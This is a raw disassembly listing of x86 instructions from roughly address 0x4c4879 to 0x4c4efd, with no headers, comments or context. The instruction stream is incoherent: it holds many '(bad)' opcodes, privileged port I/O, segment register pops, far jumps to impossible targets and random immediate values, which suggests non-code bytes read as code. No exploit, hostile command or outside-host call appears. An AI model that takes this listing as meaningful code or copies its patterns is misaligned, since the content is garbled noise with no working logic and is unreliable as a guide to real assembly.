  4c4879:	mov    bl,0x1f
  4c487b:	inc    esp
  4c487c:	adc    eax,DWORD PTR [eax]
  4c487e:	adc    eax,0x370ad14b
  4c4883:	push   ds
  4c4884:	push   eax
  4c4885:	out    dx,eax
  4c4886:	xor    BYTE PTR [esi],al
  4c4888:	pop    esp
  4c4889:	and    ebx,DWORD PTR [ebx]
  4c488b:	pop    es
  4c488c:	pop    ebx
  4c488d:	ins    DWORD PTR es:[edi],dx
  4c488e:	adc    eax,0x3f3bb3f5
  4c4893:	addr16 push esi
  4c4895:	cmp    esi,DWORD PTR [edx]
  4c4897:	dec    eax
  4c4898:	inc    edi
  4c4899:	pop    edi
  4c489a:	imul   esi,DWORD PTR [esp+eax*8+0x1347d60e],0x3f
  4c48a2:	imul   ebx,eax,0x52
  4c48a5:	dec    ebx
  4c48a6:	mov    ah,0x4f
  4c48a8:	(bad)  
  4c48a9:	pop    ds
  4c48aa:	pop    ebx
  4c48ab:	mov    ebx,0x27bf0d6d
  4c48b0:	push   ss
  4c48b1:	dec    ebx
  4c48b2:	daa    
  4c48b3:	mov    ah,0x2f
  4c48b5:	in     eax,dx
  4c48b6:	dec    eax
  4c48b7:	adc    edx,DWORD PTR [ebx]
  4c48b9:	das    
  4c48ba:	mov    ah,0xd1
  4c48bc:	pop    esi
  4c48bd:	imul   esp,DWORD PTR [edi-0x7ae0d0b1],0xc7ae0455
  4c48c7:	scas   eax,DWORD PTR es:[edi]
  4c48c8:	sbb    eax,0x6268e03d
  4c48cd:	shl    DWORD PTR [ebx+0x23],cl
  4c48d0:	adc    ch,0xae
  4c48d3:	push   ss
  4c48d4:	dec    ebx
  4c48d5:	aas    
  4c48d6:	inc    edi
  4c48d7:	pop    ds
  4c48d8:	out    0xf6,eax
  4c48da:	jo     0x4c48b7
  4c48dc:	jmp    0xf16b:0x934f3759
  4c48e3:	mov    ah,0x2
  4c48e5:	out    dx,eax
  4c48e6:	out    dx,eax
  4c48e7:	sub    dl,dh
  4c48e9:	(bad)  
  4c48ea:	add    DWORD PTR [ebx+esi*1],edi
  4c48ed:	sbb    esp,DWORD PTR [edi]
  4c48ef:	imul   ebp,DWORD PTR [ebx+0x472f8377],0xffffff9b
  4c48f6:	es aaa 
  4c48f8:	dec    edx
  4c48f9:	in     eax,dx
  4c48fa:	mov    esp,0x4ca2e745
  4c48ff:	das    
  4c4900:	mov    dh,0x8a
  4c4902:	mov    ah,0xad
  4c4904:	imul   DWORD PTR [edi]
  4c4906:	xor    esi,DWORD PTR [edi]
  4c4908:	mov    ch,0xb6
  4c490a:	es and eax,0x18732fdf
  4c4910:	ins    DWORD PTR es:[edi],dx
  4c4911:	daa    
  4c4912:	pop    ss
  4c4913:	das    
  4c4914:	xchg   ebx,eax
  4c4915:	mov    ch,BYTE PTR [ebx+0x2fb46aad]
  4c491b:	out    dx,eax
  4c491c:	aaa    
  4c491d:	inc    eax
  4c491e:	rol    DWORD PTR [edx-0x42],1
  4c4921:	dec    edi
  4c4922:	das    
  4c4923:	inc    esp
  4c4924:	inc    edx
  4c4925:	dec    ebx
  4c4926:	outs   dx,BYTE PTR ds:[esi]
  4c4927:	shl    BYTE PTR [eax-0x55],1
  4c492a:	push   edi
  4c492b:	aaa    
  4c492c:	ror    DWORD PTR [eax+esi*4+0x76],cl
  4c4930:	push   es
  4c4931:	sbb    esp,edi
  4c4933:	mov    edi,DWORD PTR [esi-0x4b773c49]
  4c4939:	sbb    bl,al
  4c493b:	scas   eax,DWORD PTR es:[edi]
  4c493c:	push   edi
  4c493d:	shl    DWORD PTR [ebp+eax*1-0x2df4b8ce],0x31
  4c4945:	or     dh,BYTE PTR [esi+0x6b8727]
  4c494b:	mov    esp,0x1f47f451
  4c4950:	daa    
  4c4951:	or     esi,DWORD PTR [esi]
  4c4953:	fstp   QWORD PTR [edx-0x51]
  4c4956:	pop    ds
  4c4957:	push   eax
  4c4958:	aaa    
  4c4959:	bound  edx,QWORD PTR [ebx+0x4b]
  4c495c:	add    eax,0xb7413f0f
  4c4961:	or     dh,BYTE PTR [eax+0x64]
  4c4964:	mov    al,0xdb
  4c4966:	ret    
  4c4967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4968:	push   0x2b
  4c496a:	mov    al,0xda
  4c496c:	dec    edi
  4c496d:	das    
  4c496e:	aaa    
  4c496f:	(bad)  
  4c4970:	aad    0x56
  4c4972:	(bad)  
  4c4973:	cmova  ecx,DWORD PTR [esi+eax*2-0x74]
  4c4978:	adc    ebx,edi
  4c497a:	stos   DWORD PTR es:[edi],eax
  4c497b:	aas    
  4c497c:	daa    
  4c497d:	mov    ebp,0x3fc13171
  4c4982:	inc    edi
  4c4983:	pop    ebx
  4c4984:	mov    edx,0xdab1d5b4
  4c4989:	xor    al,BYTE PTR [edi-0x79]
  4c498c:	aas    
  4c498d:	mov    dh,0x8e
  4c498f:	dec    edi
  4c4990:	pusha  
  4c4991:	dec    edi
  4c4992:	xor    ecx,DWORD PTR [edi-0x50]
  4c4995:	push   0x1f
  4c4997:	or     DWORD PTR [ebx+0x11a2da57],0xffffffeb
  4c499e:	mov    ebx,0x877f3f41
  4c49a3:	inc    edi
  4c49a4:	stos   DWORD PTR es:[edi],eax
  4c49a5:	lods   eax,DWORD PTR ds:[esi]
  4c49a6:	or     eax,0xf09f3fcb
  4c49ab:	loop   0x4c4962
  4c49ad:	push   0x440fb247
  4c49b2:	adc    al,0x62
  4c49b4:	pop    edi
  4c49b5:	cmp    eax,0x4f4f4de3
  4c49ba:	and    dl,BYTE PTR [ebp*4-0x10c0608a]
  4c49c1:	cmp    BYTE PTR [ebp+0x564f574a],ah
  4c49c7:	stos   BYTE PTR es:[edi],al
  4c49c8:	inc    ebp
  4c49c9:	cli    
  4c49ca:	mov    al,ds:0x7faad46d
  4c49cf:	pop    edi
  4c49d0:	scas   eax,DWORD PTR es:[edi]
  4c49d1:	leave  
  4c49d2:	push   eax
  4c49d3:	je     0x4c4a15
  4c49d5:	mov    dl,0x3f
  4c49d7:	inc    edi
  4c49d8:	rcl    BYTE PTR [esi-0x4f],1
  4c49db:	push   ss
  4c49dc:	and    eax,DWORD PTR [edi-0x54]
  4c49df:	adc    BYTE PTR [ecx-0x7c98885a],al
  4c49e5:	mov    dh,0xb
  4c49e7:	add    edx,esi
  4c49e9:	dec    edi
  4c49ea:	dec    edi
  4c49eb:	lds    ebx,FWORD PTR [edx]
  4c49ed:	ror    DWORD PTR [edi+ebx*1+0x45],0xe7
  4c49f2:	sub    esp,DWORD PTR [eax]
  4c49f4:	rol    DWORD PTR [edx],1
  4c49f6:	mov    cl,0x67
  4c49f8:	push   edi
  4c49f9:	xchg   esi,eax
  4c49fa:	push   0x69
  4c49fc:	dec    ebx
  4c49fd:	push   esi
  4c49fe:	stos   DWORD PTR es:[edi],eax
  4c49ff:	push   edi
  4c4a00:	inc    edi
  4c4a01:	jge    0x4c49eb
  4c4a03:	sbb    DWORD PTR [ecx-0x5b894065],ecx
  4c4a09:	push   ebx
  4c4a0a:	mov    al,ds:0x9f6b764f
  4c4a0f:	push   0x4b8b1b8b
  4c4a14:	push   edi
  4c4a15:	push   ds
  4c4a16:	mov    cl,0x68
  4c4a18:	xchg   edi,eax
  4c4a19:	cs lahf 
  4c4a1b:	sbb    esp,DWORD PTR [eax]
  4c4a1d:	pop    esp
  4c4a1e:	xor    eax,0x6b4d47d1
  4c4a23:	dec    eax
  4c4a24:	loop   0x4c4a67
  4c4a26:	mov    esi,esi
  4c4a28:	pop    ds
  4c4a29:	push   edi
  4c4a2a:	imul   ecx,DWORD PTR ds:0x2f8016da,0x57
  4c4a31:	inc    edi
  4c4a32:	push   es
  4c4a33:	mov    cl,0x2d
  4c4a35:	adc    al,0xc7
  4c4a37:	scas   eax,DWORD PTR es:[edi]
  4c4a38:	rcl    BYTE PTR ds:0xd56d,cl
  4c4a3d:	push   edi
  4c4a3e:	inc    edi
  4c4a3f:	push   cs
  4c4a40:	inc    edx
  4c4a41:	inc    esi
  4c4a42:	mov    DWORD PTR [ebx+eax*8+0x4f],eax
  4c4a46:	add    eax,DWORD PTR [ebp-0x2f]
  4c4a49:	sub    edx,esp
  4c4a4b:	dec    edi
  4c4a4c:	push   esi
  4c4a4d:	iret   
  4c4a4e:	and    ah,dl
  4c4a50:	(bad)  
  4c4a51:	test   DWORD PTR [ebx],eax
  4c4a53:	dec    edi
  4c4a54:	dec    eax
  4c4a55:	or     BYTE PTR [ebp+esi*1+0x402b57eb],dh
  4c4a5c:	mov    ds:0x3fd787e0,al
  4c4a61:	xor    eax,0x4f68baaa
  4c4a66:	inc    ecx
  4c4a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4a68:	pop    edx
  4c4a69:	sub    al,BYTE PTR [esi]
  4c4a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4a6c:	retf   
  4c4a6d:	(bad)  [edi+0x42]
  4c4a70:	dec    ebp
  4c4a71:	imul   eax,DWORD PTR [edx+eiz*1+0x1ba4830f],0xffffff85
  4c4a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4a7a:	push   edi
  4c4a7b:	pop    eax
  4c4a7c:	or     al,0xb4
  4c4a7e:	xor    eax,0x414f230b
  4c4a83:	scas   al,BYTE PTR es:[edi]
  4c4a84:	inc    ecx
  4c4a85:	cmp    DWORD PTR [ebp+0x63],0x7046a7ef
  4c4a8c:	lea    eax,[eiz*1+0x6c66ffdb]
  4c4a93:	mov    dh,0x2e
  4c4a95:	out    dx,eax
  4c4a96:	jg     0x4c4a3b
  4c4a98:	pop    ebx
  4c4a99:	ins    DWORD PTR es:[edi],dx
  4c4a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c4a9b:	xor    eax,0xac2737af
  4c4aa0:	jbe    0x4c4afe
  4c4aa2:	pop    eax
  4c4aa3:	mov    ecx,DWORD PTR [ebp+0x2f]
  4c4aa6:	fs adc dl,bl
  4c4aa9:	sub    dh,BYTE PTR [ebx-0x3f2accd1]
  4c4aaf:	bound  ecx,QWORD PTR [edi]
  4c4ab1:	xlat   BYTE PTR ds:[ebx]
  4c4ab2:	inc    edx
  4c4ab3:	aaa    
  4c4ab4:	repz pop eax
  4c4ab6:	in     al,dx
  4c4ab7:	jmp    0x4c4a6d
  4c4ab9:	es dec edi
  4c4abb:	sti    
  4c4abc:	jg     0x4c4af4
  4c4abe:	push   0xd7d634b3
  4c4ac3:	jnp    0x4c4b30
  4c4ac5:	jmp    0x4c4ace
  4c4ac7:	(bad)  
  4c4ac8:	aas    
  4c4ac9:	arpl   WORD PTR [ecx+0x57],bx
  4c4acc:	sub    esi,esi
  4c4ace:	mov    al,ds:0x5982dfa7
  4c4ad3:	inc    edi
  4c4ad4:	mov    dh,0x62
  4c4ad6:	imul   esp,DWORD PTR [edx+0x2f],0x41
  4c4ada:	mov    ds:0xad2ac137,eax
  4c4adf:	lods   eax,DWORD PTR ds:[esi]
  4c4ae0:	daa    
  4c4ae1:	call   DWORD PTR [edi]
  4c4ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c4ae4:	shl    DWORD PTR [esi-0x5ad8c0ef],0xcb
  4c4aeb:	pop    edx
  4c4aec:	pop    ebx
  4c4aed:	cmp    esp,DWORD PTR [edi]
  4c4aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4af0:	fdiv   QWORD PTR [edx]
  4c4af2:	or     eax,0x4757fe07
  4c4af7:	pop    edx
  4c4af8:	mov    WORD PTR [esi-0x835d4e5],?
  4c4afe:	aas    
  4c4aff:	ins    DWORD PTR es:[edi],dx
  4c4b00:	jno    0x4c4b25
  4c4b02:	xor    eax,0x522fb7f7
  4c4b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c4b08:	daa    
  4c4b09:	or     al,0x48
  4c4b0b:	fld    TBYTE PTR [ebx-0x3ad4c25f]
  4c4b11:	inc    edi
  4c4b12:	addr16 aas 
  4c4b14:	(bad)
  4c4b18:	scas   eax,DWORD PTR es:[edi]
  4c4b19:	das    
  4c4b1a:	pop    es
  4c4b1b:	shl    DWORD PTR [ecx-0x4b],0xb7
  4c4b1f:	shl    BYTE PTR [ebx-0x94ee409],cl
  4c4b25:	mov    DWORD PTR [ebx],ebp
  4c4b27:	ja     0x4c4b4c
  4c4b29:	aas    
  4c4b2a:	jbe    0x4c4afc
  4c4b2c:	push   0x554f2fc5
  4c4b31:	daa    
  4c4b32:	daa    
  4c4b33:	popf   
  4c4b34:	ret    0xb035
  4c4b37:	jecxz  0x4c4b58
  4c4b39:	pop    es
  4c4b3a:	mov    bh,0xda
  4c4b3c:	mov    cl,0x2f
  4c4b3e:	add    BYTE PTR [edi+0xf],al
  4c4b41:	sub    BYTE PTR [ebp+0x4b6b6952],0x47
  4c4b48:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c4b4a:	and    eax,0xfb77ac2a
  4c4b4f:	das    
  4c4b50:	sub    BYTE PTR [ebp+0x4bb33586],0x4f
  4c4b57:	pop    eax
  4c4b58:	in     al,dx
  4c4b59:	mov    gs,WORD PTR [edi+0x4e]
  4c4b5c:	repz push ebx
  4c4b5e:	scas   eax,DWORD PTR es:[edi]
  4c4b5f:	dec    ebx
  4c4b60:	dec    edi
  4c4b61:	push   esi
  4c4b62:	mov    eax,ds:0x3f4af445
  4c4b67:	mov    bh,0xb4
  4c4b69:	call   0x5b741d8f
  4c4b6e:	inc    edi
  4c4b6f:	test   DWORD PTR ds:0x2ae02ec0,0x9744bbcb
  4c4b79:	outs   dx,BYTE PTR ds:[esi]
  4c4b7a:	or     eax,0x56fb1f45
  4c4b7f:	sub    esi,DWORD PTR [ebp+ebp*1+0x271b4738]
  4c4b86:	mov    ebx,0x6390c063
  4c4b8b:	pop    ds
  4c4b8c:	inc    edi
  4c4b8d:	xchg   ebx,eax
  4c4b8e:	and    eax,0xfe4bc078
  4c4b93:	sti    
  4c4b94:	fisttp WORD PTR [esi]
  4c4b96:	pusha  
  4c4b97:	je     0x4c4b4a
  4c4b99:	aas    
  4c4b9a:	inc    ebx
  4c4b9b:	cs shl ecx,cl
  4c4b9e:	add    BYTE PTR [esi+esi*4],ch
  4c4ba1:	das    
  4c4ba2:	dec    ebx
  4c4ba3:	jno    0x4c4b66
  4c4ba5:	mov    gs,WORD PTR [esi+0x463fb383]
  4c4bab:	inc    ebp
  4c4bac:	mov    eax,0xafc30ed1
  4c4bb1:	jb     0x4c4c2e
  4c4bb3:	push   ss
  4c4bb4:	pop    esp
  4c4bb5:	arpl   WORD PTR [ebp+0x37],bp
  4c4bb8:	xchg   esi,eax
  4c4bb9:	push   eax
  4c4bba:	pop    ebx
  4c4bbb:	add    eax,0x2fd4d82c
  4c4bc0:	inc    esp
  4c4bc1:	pop    edi
  4c4bc2:	push   edx
  4c4bc3:	xchg   ecx,eax
  4c4bc4:	mov    al,0x76
  4c4bc6:	pop    ds
  4c4bc7:	das    
  4c4bc8:	xchg   edi,eax
  4c4bc9:	jbe    0x4c4bc0
  4c4bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c4bcc:	shl    BYTE PTR [edi],1
  4c4bce:	ja     0x4c4b87
  4c4bd0:	aas    
  4c4bd1:	ror    BYTE PTR [ebx],0x11
  4c4bd4:	lods   al,BYTE PTR ds:[esi]
  4c4bd5:	aas    
  4c4bd6:	aaa    
  4c4bd7:	in     eax,dx
  4c4bd8:	or     cl,BYTE PTR [esi]
  4c4bda:	sub    ebx,DWORD PTR [edi-0x75]
  4c4bdd:	xrelease xchg DWORD PTR [esi+eax*2+0x1f5b5d],esp
  4c4be5:	call   DWORD PTR [ebp-0x57]
  4c4be8:	lea    ebp,[esi+0xf]
  4c4beb:	inc    edi
  4c4bec:	fcmovnu st,st(3)
  4c4bee:	test   eax,0x97470b14
  4c4bf3:	aas    
  4c4bf4:	sub    DWORD PTR [eax-0x2b],0x51a3cf56
  4c4bfb:	mov    dh,0x2
  4c4bfd:	ins    BYTE PTR es:[edi],dx
  4c4bfe:	aas    
  4c4bff:	ret    
  4c4c00:	pop    ds
  4c4c01:	jae    0x4c4c53
  4c4c03:	pop    es
  4c4c04:	pop    eax
  4c4c05:	pop    ebx
  4c4c06:	daa    
  4c4c07:	scas   eax,DWORD PTR es:[edi]
  4c4c08:	rcl    DWORD PTR [edx-0x49],0x16
  4c4c0c:	imul   ecx,ebx,0x4f
  4c4c0f:	(bad)  
  4c4c10:	push   0x476720ab
  4c4c15:	jnp    0x4c4bb4
  4c4c17:	mov    eax,0xdb3f6d18
  4c4c1c:	rol    DWORD PTR [edx],cl
  4c4c1e:	aaa    
  4c4c1f:	or     eax,0x87003f2d
  4c4c24:	push   edx
  4c4c25:	xor    eax,0x23adb684
  4c4c2a:	daa    
  4c4c2b:	pop    ds
  4c4c2c:	mov    edi,0x6f0d0baa
  4c4c31:	das    
  4c4c32:	pop    ds
  4c4c33:	es fwait
  4c4c35:	cmp    BYTE PTR [edx],ah
  4c4c37:	sahf   
  4c4c38:	mov    ch,0x67
  4c4c3a:	test   DWORD PTR [esi+0x22],0x4f023002
  4c4c41:	retf   
  4c4c42:	xchg   ebp,eax
  4c4c43:	fsubr  DWORD PTR [eax+0x2fb33faf]
  4c4c49:	pop    edx
  4c4c4a:	test   al,0x4
  4c4c4c:	push   esi
  4c4c4d:	(bad)  
  4c4c4e:	aas    
  4c4c4f:	add    eax,0xe2900da3
  4c4c54:	das    
  4c4c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4c56:	ins    BYTE PTR es:[edi],dx
  4c4c57:	je     0x4c4cbb
  4c4c59:	mov    ah,0x2f
  4c4c5b:	fistp  QWORD PTR [edi]
  4c4c5d:	mov    es,WORD PTR [edx+0x3484c6f]
  4c4c63:	cmova  ebp,DWORD PTR [edx]
  4c4c66:	pop    eax
  4c4c67:	mov    cl,0x48
  4c4c69:	ja     0x4c4c62
  4c4c6b:	xchg   al,bl
  4c4c6d:	push   0xffffffd0
  4c4c6f:	idiv   DWORD PTR [edi+0x46]
  4c4c72:	imul   ebp,DWORD PTR [ebx-0x78558ff3],0x33
  4c4c79:	pop    eax
  4c4c7a:	mov    edx,0xfb3768d6
  4c4c7f:	mov    dh,0x2d
  4c4c81:	push   edi
  4c4c82:	add    DWORD PTR [eax+0x773b44df],0xac4bc16c
  4c4c8c:	xchg   DWORD PTR [ebp+0x37],ecx
  4c4c8f:	aas    
  4c4c90:	pop    ebx
  4c4c91:	add    eax,0x37b71930
  4c4c96:	nop
  4c4c97:	sbb    BYTE PTR [ecx],dh
  4c4c99:	shl    BYTE PTR [esi+0x3b],cl
  4c4c9c:	mov    ch,0x10
  4c4c9e:	pop    ebx
  4c4c9f:	daa    
  4c4ca0:	jnp    0x4c4ce9
  4c4ca2:	jg     0x4c4cbe
  4c4ca4:	mov    bl,0x71
  4c4ca6:	and    ebx,eax
  4c4ca8:	retf   
  4c4ca9:	push   eax
  4c4caa:	add    ebp,DWORD PTR [ecx]
  4c4cac:	shl    BYTE PTR [esi-0x4118e0dd],0xbe
  4c4cb3:	in     eax,dx
  4c4cb4:	loop   0x4c4ccc
  4c4cb6:	push   edx
  4c4cb7:	pop    ebx
  4c4cb8:	pop    ss
  4c4cb9:	cmovne esp,ebx
  4c4cbc:	or     ah,BYTE PTR [ebx+0x62]
  4c4cbf:	adc    ebp,DWORD PTR [edi-0xefcb262]
  4c4cc5:	ss pop ss
  4c4cc7:	dec    edi
  4c4cc8:	fild   WORD PTR [edx+0x4a]
  4c4ccb:	aam    0x58
  4c4ccd:	dec    ecx
  4c4cce:	dec    ebx
  4c4ccf:	out    dx,eax
  4c4cd0:	push   ebx
  4c4cd1:	fild   DWORD PTR [edx+0x73587b1f]
  4c4cd7:	pop    ds
  4c4cd8:	xchg   ebx,eax
  4c4cd9:	into   
  4c4cda:	sub    al,0x31
  4c4cdc:	fild   WORD PTR [edi+0x52]
  4c4cdf:	mov    bh,0x14
  4c4ce1:	adc    DWORD PTR [edi+0x426b276d],esi
  4c4ce7:	iret   
  4c4ce8:	pop    es
  4c4ce9:	nop
  4c4cea:	xchg   BYTE PTR [edi+ebx*2-0x75e9b861],dh
  4c4cf1:	sbb    BYTE PTR [ebx+0x66],0xe7
  4c4cf5:	aas    
  4c4cf6:	mov    cl,0xd8
  4c4cf8:	xchg   ebx,eax
  4c4cf9:	mov    al,0x5f
  4c4cfb:	daa    
  4c4cfc:	aaa    
  4c4cfd:	xchg   ebp,eax
  4c4cfe:	sub    eax,0x6f27bf76
  4c4d03:	arpl   WORD PTR [eax+0x702158],cx
  4c4d09:	mov    bh,0x20
  4c4d0b:	cdq    
  4c4d0c:	pop    edx
  4c4d0d:	mov    bh,dh
  4c4d0f:	inc    edi
  4c4d10:	inc    edi
  4c4d11:	cmp    al,BYTE PTR [esp+ebp*1]
  4c4d14:	(bad)  
  4c4d15:	sbb    eax,DWORD PTR [ebx-0x53]
  4c4d18:	push   edi
  4c4d19:	mov    dh,0xe0
  4c4d1b:	inc    ecx
  4c4d1c:	mov    bl,0xe7
  4c4d1e:	shr    BYTE PTR [eax+edi*4+0x1f2a6d76],cl
  4c4d25:	dec    ecx
  4c4d26:	pop    ss
  4c4d27:	inc    ebx
  4c4d28:	pop    edi
  4c4d29:	or     DWORD PTR [edx-0x20],ecx
  4c4d2c:	dec    esi
  4c4d2d:	mov    edi,0xd76e3b42
  4c4d32:	push   0x69
  4c4d34:	aas    
  4c4d35:	aaa    
  4c4d36:	fwait
  4c4d37:	add    DWORD PTR [ecx+edi*4],eax
  4c4d3a:	repz fisub DWORD PTR [edx+0x5a]
  4c4d3e:	inc    edx
  4c4d3f:	jb     0x4c4d47
  4c4d41:	push   0x1
  4c4d43:	xor    DWORD PTR [edi],esp
  4c4d45:	icebp  
  4c4d46:	sbb    DWORD PTR [esp+esi*1+0x2a],0x8d004744
  4c4d4e:	(bad)  [edx+0x27]
  4c4d51:	or     esi,DWORD PTR [ebx]
  4c4d53:	ror    BYTE PTR [ecx],cl
  4c4d55:	mov    esp,0x1f2e0aaf
  4c4d5a:	sub    BYTE PTR [esi],al
  4c4d5c:	sub    DWORD PTR [esi+0x4c],edi
  4c4d5f:	adc    dh,ch
  4c4d61:	dec    edx
  4c4d62:	and    bl,BYTE PTR [edi+0x78085e63]
  4c4d68:	adc    bl,BYTE PTR [edi+0x44357647]
  4c4d6e:	adc    BYTE PTR [esi],bl
  4c4d70:	ret    
  4c4d71:	jbe    0x4c4db2
  4c4d73:	add    BYTE PTR [esi+0x4e],al
  4c4d76:	stos   BYTE PTR es:[edi],al
  4c4d77:	mov    cl,0x47
  4c4d79:	js     0x4c4d82
  4c4d7b:	outs   dx,DWORD PTR ds:[esi]
  4c4d7c:	push   cs
  4c4d7d:	add    BYTE PTR [edi],dl
  4c4d7f:	data16 je 0x4c4d6d
  4c4d82:	imul   ebx,DWORD PTR [edi-0x20],0xffffffae
  4c4d86:	add    BYTE PTR [ecx+eiz*2-0x5bf1e109],bl
  4c4d8d:	les    ebp,FWORD PTR [edi+eiz*1-0x22]
  4c4d91:	pop    esp
  4c4d92:	ficomp WORD PTR [edx+0x22]
  4c4d95:	xor    al,BYTE PTR [edi+0x17]
  4c4d98:	mov    ds:0x32639def,eax
  4c4d9d:	pop    ds
  4c4d9e:	add    BYTE PTR [edx-0x4736e087],bh
  4c4da4:	mov    ah,0x83
  4c4da6:	and    BYTE PTR [edi],ch
  4c4da8:	mov    edx,0x915b6f75
  4c4dad:	jno    0x4c4d38
  4c4daf:	push   ebx
  4c4db0:	mov    ebx,DWORD PTR ss:[ebx-0x139cdcf7]
  4c4db7:	je     0x4c4de8
  4c4db9:	pop    edx
  4c4dba:	mov    dh,0xb6
  4c4dbc:	ss push es
  4c4dbe:	push   edi
  4c4dbf:	dec    edi
  4c4dc0:	test   DWORD PTR [edi-0x59f546d2],0x4e46f752
  4c4dca:	pop    edi
  4c4dcb:	adc    bl,0x42
  4c4dce:	xlat   BYTE PTR ds:[ebx]
  4c4dcf:	mov    ds:0x83e60c3,eax
  4c4dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4dd5:	dec    ebp
  4c4dd6:	andnps xmm6,XMMWORD PTR [ecx-0x4c]
  4c4dda:	push   0x21
  4c4ddc:	retf   
  4c4ddd:	imul   ebx,DWORD PTR [ebx+0x3fe12e8e],0x53
  4c4de4:	iret   
  4c4de5:	imul   esi,DWORD PTR [esi+0x436b6b1e],0x5f
  4c4dec:	jecxz  0x4c4e3a
  4c4dee:	daa    
  4c4def:	sbb    DWORD PTR [edi+0x4b733d7a],0x5b
  4c4df6:	out    0x25,eax
  4c4df8:	inc    esi
  4c4df9:	xor    esi,ecx
  4c4dfb:	jle    0x4c4e16
  4c4dfd:	out    dx,eax
  4c4dfe:	aas    
  4c4dff:	add    bl,BYTE PTR [edi+ecx*4-0x1d]
  4c4e03:	mov    ebp,0x6cf7865f
  4c4e08:	sti    
  4c4e09:	pop    ss
  4c4e0a:	sub    edi,0xffffff8e
  4c4e0d:	inc    ebx
  4c4e0e:	pop    ds
  4c4e0f:	pop    DWORD PTR [eax]
  4c4e11:	outs   dx,DWORD PTR ds:[esi]
  4c4e12:	dec    edi
  4c4e13:	ja     0x4c4d9e
  4c4e15:	test   BYTE PTR [ecx-0x2e],ch
  4c4e18:	add    BYTE PTR [edi+0x66e11f5f],ch
  4c4e1e:	sbb    eax,0x3ceb4b00
  4c4e23:	int    0xf
  4c4e25:	push   ebx
  4c4e26:	or     eax,0x35163ebb
  4c4e2b:	test   al,0x44
  4c4e2d:	mov    ch,0xe8
  4c4e2f:	xor    BYTE PTR [edx+0x0],ch
  4c4e32:	addr16 aas 
  4c4e34:	inc    ebp
  4c4e35:	inc    edx
  4c4e36:	arpl   WORD PTR ds:0x2577ff41,dx
  4c4e3c:	fadd   QWORD PTR [ebx+ebx*4+0x53777e69]
  4c4e43:	mov    edi,cs
  4c4e45:	adc    dl,BYTE PTR [edx-0x39]
  4c4e48:	fbstp  TBYTE PTR [ebp+edx*4+0x6]
  4c4e4c:	or     BYTE PTR ds:0xb6c75fc7,cl
  4c4e52:	xchg   esi,eax
  4c4e53:	(bad)  
  4c4e54:	aaa    
  4c4e55:	mov    ?,WORD PTR [ebx-0x2]
  4c4e58:	cs cs out dx,al
  4c4e5b:	sti    
  4c4e5c:	xchg   DWORD PTR [ebx],esp
  4c4e5e:	je     0x4c4e72
  4c4e60:	lahf   
  4c4e61:	or     cl,BYTE PTR [ebp-0x31]
  4c4e64:	inc    ebp
  4c4e65:	sub    DWORD PTR [edi+ebp*8],esi
  4c4e68:	fidiv  WORD PTR [ecx]
  4c4e6a:	add    BYTE PTR [edx+0x2c],dh
  4c4e6d:	add    al,0xf0
  4c4e6f:	sar    BYTE PTR [edx+0x5b],0x8f
  4c4e73:	jo     0x4c4e4c
  4c4e75:	imul   ebp,DWORD PTR [eax+edi*4],0x73732faf
  4c4e7c:	rcr    DWORD PTR [eax-0x54],cl
  4c4e7f:	ins    DWORD PTR es:[edi],dx
  4c4e80:	addr16 pop esi
  4c4e82:	bound  edx,QWORD PTR [edi-0x72]
  4c4e85:	dec    ebp
  4c4e86:	dec    edx
  4c4e87:	in     eax,dx
  4c4e88:	jnp    0x4c4ee1
  4c4e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c4e8b:	arpl   WORD PTR [ebp+0x2b],si
  4c4e8e:	lods   al,BYTE PTR ds:[esi]
  4c4e8f:	sbb    ecx,DWORD PTR [edi+0x36]
  4c4e92:	xchg   edi,eax
  4c4e93:	mul    DWORD PTR [edx+0xa]
  4c4e96:	or     BYTE PTR [eax],dl
  4c4e98:	lods   al,BYTE PTR ds:[esi]
  4c4e99:	inc    edi
  4c4e9a:	aas    
  4c4e9b:	mov    esi,DWORD PTR [ebx+ecx*2]
  4c4e9e:	mov    eax,0x611a6117
  4c4ea3:	rcr    BYTE PTR [eax-0x10],cl
  4c4ea6:	fidivr WORD PTR [ebp+0x686a5a1f]
  4c4eac:	pop    ds
  4c4ead:	xchg   edi,eax
  4c4eae:	rol    dh,1
  4c4eb0:	sbb    al,BYTE PTR [ebx+0x23]
  4c4eb3:	arpl   WORD PTR [edi-0x2e],bp
  4c4eb6:	jbe    0x4c4e79
  4c4eb8:	(bad)
  4c4ebb:	fwait
  4c4ebc:	dec    edi
  4c4ebd:	outs   dx,BYTE PTR ds:[esi]
  4c4ebe:	ja     0x4c4f33
  4c4ec0:	out    dx,eax
  4c4ec1:	xchg   esi,eax
  4c4ec2:	pusha  
  4c4ec3:	in     eax,dx
  4c4ec4:	in     al,0x30
  4c4ec6:	xor    ecx,edi
  4c4ec8:	cmp    esp,DWORD PTR [edi+0x8]
  4c4ecb:	lea    edx,[esi-0x3f]
  4c4ece:	btc    DWORD PTR [ebx-0x22],esi
  4c4ed2:	mov    ah,0xb5
  4c4ed4:	outs   dx,DWORD PTR ds:[esi]
  4c4ed5:	(bad)  
  4c4ed6:	cmp    edx,DWORD PTR [edi+0x1832a231]
  4c4edc:	mov    edx,ss
  4c4ede:	pop    eax
  4c4edf:	pop    ds
  4c4ee0:	mul    BYTE PTR [edi-0x7c43931f]
  4c4ee6:	imul   esi,DWORD PTR [edi],0x37
  4c4ee9:	push   0x66ddfc84
  4c4eee:	push   edi
  4c4eef:	ins    DWORD PTR es:[edi],dx
  4c4ef0:	add    BYTE PTR [eax],dh
  4c4ef2:	sbb    eax,0xebed6c42
  4c4ef7:	addr16 dec edi
  4c4ef9:	pop    ss
  4c4efa:	fcomp  DWORD PTR [bp+si]
  4c4efd:	ret    0xb762
